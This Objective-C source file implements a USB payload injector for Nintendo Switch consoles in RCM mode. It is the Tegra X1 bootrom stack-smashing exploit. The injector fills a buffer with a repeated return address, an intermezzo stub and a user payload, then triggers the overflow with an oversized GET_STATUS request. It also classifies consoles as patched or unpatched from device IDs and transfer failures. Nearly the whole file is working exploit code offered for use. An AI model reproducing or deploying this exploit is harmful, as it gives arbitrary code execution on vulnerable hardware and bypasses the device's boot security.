#import "RCMInjector.h"

static const UInt32 kRCMPayloadAddr    = 0x40010000;
static const UInt32 kIntermezzoAddr    = 0x4001F000;
static const UInt32 kPayloadLoadBlock  = 0x40020000;
static const UInt32 kMaxLength         = 0x30298;
static const UInt32 kPacketSize        = 0x1000;
static const UInt32 kMarikoStopOffset  = 0x10000;
static const UInt32 kV1StopOffset      = 0x0F000;

#define kDMASize 0x7000u

static NSString *formattedBytes(NSUInteger n) {
    return [NSNumberFormatter localizedStringFromNumber:@(n)
                                           numberStyle:NSNumberFormatterDecimalStyle];
}

@implementation RCMResult

+ (instancetype)success:(NSString *)deviceId {
    RCMResult *r = [RCMResult new];
    r.type = RCMResultSuccess;
    r.deviceId = deviceId;
    return r;
}
+ (instancetype)patchedV1:(NSString *)deviceId {
    RCMResult *r = [RCMResult new];
    r.type = RCMResultPatchedV1;
    r.deviceId = deviceId;
    return r;
}
+ (instancetype)patchedV2:(NSString *)deviceId {
    RCMResult *r = [RCMResult new];
    r.type = RCMResultPatchedV2;
    r.deviceId = deviceId;
    return r;
}
+ (instancetype)error:(NSString *)message {
    RCMResult *r = [RCMResult new];
    r.type = RCMResultError;
    r.errorMessage = message;
    return r;
}

@end

@implementation RCMInjector

+ (RCMResult *)injectPayload:(NSData *)payloadData
                  intermezzo:(NSData *)intermezzo
                      device:(NXUSBDeviceInterface **)device
                    logBlock:(void (^)(NSString *line))log {

    kern_return_t kr;

    kr = NXCOMCall(device, USBDeviceOpenSeize);
    if (kr) return [RCMResult error:[NSString stringWithFormat:@"Could not open USB device (0x%08x). Is the Switch in RCM mode?", kr]];

    kr = NXCOMCall(device, SetConfiguration, 1);
    if (kr) {
        NXCOMCall(device, USBDeviceClose);
        return [RCMResult error:[NSString stringWithFormat:@"SetConfiguration failed (0x%08x).", kr]];
    }

    IOUSBFindInterfaceRequest req = {
        kIOUSBFindInterfaceDontCare,
        kIOUSBFindInterfaceDontCare,
        kIOUSBFindInterfaceDontCare,
        kIOUSBFindInterfaceDontCare
    };
    io_iterator_t intfIter = 0;
    NXCOMCall(device, CreateInterfaceIterator, &req, &intfIter);

    NXUSBSubInterface **intf = NULL;
    io_service_t intfService = 0;
    io_service_t svc;
    while ((svc = IOIteratorNext(intfIter))) {
        NSNumber *n = (__bridge_transfer NSNumber *)
            IORegistryEntryCreateCFProperty(svc, CFSTR("bInterfaceNumber"), kCFAllocatorDefault, 0);
        if (n.integerValue == 0) { intfService = svc; break; }
        IOObjectRelease(svc);
    }
    IOObjectRelease(intfIter);

    if (!intfService) {
        NXCOMCall(device, USBDeviceClose);
        return [RCMResult error:@"No interface 0 found on device."];
    }

    IOCFPlugInInterface **plug = NULL;
    SInt32 score;
    IOCreatePlugInInterfaceForService(intfService, kIOUSBInterfaceUserClientTypeID,
                                      kIOCFPlugInInterfaceID, &plug, &score);
    IOObjectRelease(intfService);

    if (!plug) {
        NXCOMCall(device, USBDeviceClose);
        return [RCMResult error:@"Failed to create interface plugin."];
    }

    (*plug)->QueryInterface(plug, CFUUIDGetUUIDBytes(kNXUSBSubInterfaceUUID), (void **)&intf);
    NXCOMCall(plug, Release);

    if (!intf) {
        NXCOMCall(device, USBDeviceClose);
        return [RCMResult error:@"QueryInterface for USB sub-interface failed."];
    }

    kr = NXCOMCall(intf, USBInterfaceOpenSeize);
    if (kr) {
        NXCOMCall(intf, Release);
        NXCOMCall(device, USBDeviceClose);
        return [RCMResult error:[NSString stringWithFormat:@"USBInterfaceOpenSeize failed (0x%08x).", kr]];
    }

    UInt8 nEndpoints = 0, readRef = 0, writeRef = 0;
    NXCOMCall(intf, GetNumEndpoints, &nEndpoints);
    for (UInt8 pipe = 1; pipe <= nEndpoints; pipe++) {
        UInt8 dir, num, xferType, interval; UInt16 maxPkt;
        NXCOMCall(intf, GetPipeProperties, pipe, &dir, &num, &xferType, &maxPkt, &interval);
        if (xferType == kUSBBulk && dir == kUSBIn  && readRef  == 0) readRef  = pipe;
        if (xferType == kUSBBulk && dir == kUSBOut && writeRef == 0) writeRef = pipe;
    }

    if (!readRef || !writeRef) {
        NXCOMCall(intf, USBInterfaceClose); NXCOMCall(intf, Release);
        NXCOMCall(device, USBDeviceClose);
        return [RCMResult error:@"Could not find bulk IN/OUT endpoints."];
    }

    log(@"Opening RCM device...");

    UInt8 idBuf[16] = {0};
    UInt32 idLen = sizeof(idBuf);
    kr = NXCOMCall(intf, ReadPipeTO, readRef, idBuf, &idLen, 2000, 2000);
    if (kr || idLen != sizeof(idBuf)) {
        NXCOMCall(intf, USBInterfaceClose); NXCOMCall(intf, Release);
        NXCOMCall(device, USBDeviceClose);
        return [RCMResult error:@"Failed to read device ID. Is the Switch in RCM mode?"];
    }
    NSMutableString *idHex = [NSMutableString stringWithCapacity:32];
    for (int i = 0; i < 16; i++) [idHex appendFormat:@"%02X", idBuf[i]];
    log([NSString stringWithFormat:@"Device ID: %@", idHex]);

    if ([idHex hasSuffix:@"2101D0"]) {
        log(@"\nThis device ID identifies as a Mariko (T214) console.");
        NXCOMCall(intf, USBInterfaceClose); NXCOMCall(intf, Release);
        NXCOMCall(device, USBDeviceClose);
        return [RCMResult patchedV2:idHex];
    }

    NSMutableData *buf = [NSMutableData dataWithCapacity:kMaxLength];

    UInt32 maxLenLE = OSSwapHostToLittleInt32(kMaxLength);
    [buf appendBytes:&maxLenLE length:4];

    UInt8 zero = 0;
    for (int i = 0; i < 676; i++) [buf appendBytes:&zero length:1];

    UInt32 intermezzoAddrLE = OSSwapHostToLittleInt32(kIntermezzoAddr);
    for (UInt32 addr = kRCMPayloadAddr; addr < kIntermezzoAddr; addr += 4)
        [buf appendBytes:&intermezzoAddrLE length:4];

    [buf appendData:intermezzo];

    NSUInteger padToPayload = kPayloadLoadBlock - kIntermezzoAddr - intermezzo.length;
    for (NSUInteger i = 0; i < padToPayload; i++) [buf appendBytes:&zero length:1];

    [buf appendData:payloadData];

    NSUInteger unpaddedLen = buf.length;

    while (buf.length % kPacketSize != 0) [buf appendBytes:&zero length:1];

    NSUInteger totalBlocks = buf.length / kPacketSize;

    log([NSString stringWithFormat:@"Buffer built: %@ bytes in %lu blocks",
         formattedBytes(buf.length), (unsigned long)totalBlocks]);
    log([NSString stringWithFormat:@"Sending payload (%lu blocks)...", (unsigned long)totalBlocks]);

    BOOL seenV1TimeoutAtF000 = NO;
    NSUInteger bytesSent = 0;
    BOOL lowBuffer = YES;
    const UInt8 *bufBytes = buf.bytes;

    RCMResult *earlyResult = nil;

    while (bytesSent < unpaddedLen || lowBuffer) {
        UInt8 chunk[kPacketSize];
        memcpy(chunk, bufBytes + bytesSent, kPacketSize);

        kr = NXCOMCall(intf, WritePipeTO, writeRef, chunk, kPacketSize, 5000, 5000);

        if (kr) {

            BOOL isStall   = (kr == kIOUSBPipeStalled);
            BOOL isAborted = (kr == kIOReturnAborted);
            BOOL isOverrun = (kr == kIOReturnOverrun);
            BOOL isTimeout = (kr == kIOUSBTransactionTimeout);

            NSString *errDesc;
            if (isStall || isAborted) errDesc = @"EPIPE (stall)";
            else if (isOverrun)       errDesc = @"EREMOTEIO";
            else if (isTimeout)       errDesc = @"ETIMEDOUT (console stopped responding)";
            else                      errDesc = [NSString stringWithFormat:@"errno 0x%08x", kr];

            log([NSString stringWithFormat:@"  Write failed at offset %@: %@",
                 formattedBytes(bytesSent), errDesc]);

            BOOL isV1Signal = isStall || isAborted || isOverrun;

            BOOL isErista = [idHex hasSuffix:@"01101062"];

            if (isV1Signal) {
                earlyResult = [RCMResult patchedV1:idHex];
            } else if (isTimeout && isErista) {

                earlyResult = [RCMResult patchedV1:idHex];
            } else if (isTimeout && bytesSent == kV1StopOffset) {
                seenV1TimeoutAtF000 = YES;
                earlyResult = [RCMResult patchedV1:idHex];
            } else if (isTimeout && bytesSent == kMarikoStopOffset && seenV1TimeoutAtF000) {
                earlyResult = [RCMResult patchedV1:idHex];
            } else if (isTimeout && bytesSent == kMarikoStopOffset) {

                earlyResult = [RCMResult patchedV2:idHex];
            } else {
                earlyResult = [RCMResult error:[NSString stringWithFormat:
                    @"Transfer failed at offset %@.", formattedBytes(bytesSent)]];
            }
            break;
        }

        if (bytesSent == kV1StopOffset) seenV1TimeoutAtF000 = NO;
        lowBuffer = !lowBuffer;
        bytesSent += kPacketSize;
    }

    if (earlyResult) {
        NXCOMCall(intf, USBInterfaceClose); NXCOMCall(intf, Release);
        NXCOMCall(device, USBDeviceClose);
        return earlyResult;
    }

    log(@"Payload sent.");
    log(@"Smashing the stack...");

    static UInt8 dmaBuffer[kDMASize];
    IOUSBDevRequestTO smashReq = {
        .bmRequestType     = 0x82,
        .bRequest          = kUSBRqGetStatus,
        .wValue            = 0,
        .wIndex            = 0,
        .wLength           = kDMASize,
        .pData             = dmaBuffer,
        .wLenDone          = 0,
        .noDataTimeout     = 100,
        .completionTimeout = 100,
    };
    kr = NXCOMCall(device, DeviceRequestTO, &smashReq);

    NXCOMCall(intf, USBInterfaceClose);
    NXCOMCall(intf, Release);
    NXCOMCall(device, USBDeviceClose);

    if (kr == 0) {
        return [RCMResult patchedV1:idHex];
    }

    if (kr == kIOUSBPipeStalled || kr == kIOReturnAborted || kr == kIOReturnOverrun) {
        return [RCMResult patchedV1:idHex];
    }

    return [RCMResult success:idHex];
}

@end
